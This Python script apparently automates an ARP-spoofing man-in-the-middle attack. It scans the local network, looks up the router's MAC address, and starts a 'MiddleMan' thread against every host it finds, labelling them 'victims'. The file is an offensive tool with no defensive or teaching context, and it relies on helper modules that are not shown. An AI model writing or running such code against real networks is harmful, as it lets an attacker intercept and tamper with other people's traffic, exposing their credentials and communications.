import os
import sys
import logging
import time
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy import all as scapy
import scanHosts
from threading import Thread
from singleVictim import Victim
import copy

victims = []
victimIPs = []

def myPrint(toPrint):
    sys.stdout = _original_stdout
    print(toPrint)
    sys.stdout = open(os.devnull, 'w')

def get_target_mac(target):        
    query = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=target)
    ans, _ = scapy.srp(query, timeout=2)
    for _, rcv in ans:
        return rcv[scapy.Ether].src

if __name__ == "__main__":
    routerMAC = get_target_mac("192.168.1.1")
    th = Thread(target = scanHosts.generateList, args=(scanHosts.d,))
    th.start()
    time.sleep(15) # wait for first hosts
    
    # start spoofing victims
    while 1:
        try:
            curHosts = list(scanHosts.d)
            for victimIP in [ip for ip in curHosts if ip not in victimIPs]:
                victimIPs.append(victimIP)
                
                vic = Victim([victimIP, "192.168.1.1"],
                             [scanHosts.d[victimIP], routerMAC])
                victims.append(vic)
                
                t = Thread(target = vic.MiddleMan, )
                t.start()
            
        except KeyboardInterrupt:
            myPrint("Starting To Restore")
            for vic in victims:
                vic.shutdown()
            myPrint("Done Restoring!")
            sys.exit(1)

    
